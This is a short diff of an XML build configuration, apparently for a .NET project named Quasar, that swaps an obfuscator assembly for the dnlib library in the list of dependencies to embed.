@@ -3,7 +3,7 @@
   <Costura>
 	  <IncludeAssemblies>
 		  Quasar.Common
-		  Quasar.Obfuscator
+	      dnlib
 		  Mono.Cecil
 		  Gma.System.MouseKeyHook
 		  Open.NAT
